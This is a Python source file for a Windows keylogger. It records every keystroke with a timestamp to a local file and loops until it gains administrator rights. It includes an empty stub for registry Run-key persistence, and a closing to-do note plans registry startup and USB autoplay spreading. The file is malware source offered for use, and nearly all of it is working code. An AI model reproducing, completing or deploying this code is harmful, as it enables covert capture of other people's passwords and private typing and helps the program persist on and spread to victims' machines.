
from pynput import keyboard
from pynput.keyboard import Listener
from datetime import datetime
import winreg 
import threading
import time
import ctypes
import os
import sys

class Keylogger:

    def __init__(self):
        self.log = "Keylogger started ..."

    # this are primary methods which should be done

    def runAsAdmin(self):
        while True:
            ans = ctypes.windll.shell32.IsUserAnAdmin()
            if ans == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas",
                                                    sys.executable, 
                                                    "".join(sys.argv),
                                                    None, 1)
            else:
                break


    def addToStartup(self):
        scriptPath = os.path.abspath(sys.argv[0])
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"

        try:
            pass
        
        except:
            pass

    

    # This are easy methods to understand

    def saveLogToFile(self, log):
        with open("keylog.txt", "a") as file:
            file.write(log)
            file.close()

    def saveData(self, key):
        try:
            currentKey = str(key.char) 
        except AttributeError:
            if key == key.space:
                currentKey = "SPACE" 
            elif key == key.esc:
                currentKey = "ESC" 
            else:
                currentKey = " " + str(key) + " "

        currentTime = datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
        log = currentTime + " -> " + currentKey + "\n"
        self.saveLogToFile(log)

    def run(self):

        with keyboard.Listener(on_press=self.saveData) as keyboardListener:
            keyboardListener.join()




if __name__ == "__main__":
    logger = Keylogger()
    logger.run()
































"""
--> tasks which I should do now 
    
    - the script should move to registry of windows

    - also for pendrive just research about autoplay and python code 
      to on that also


"""


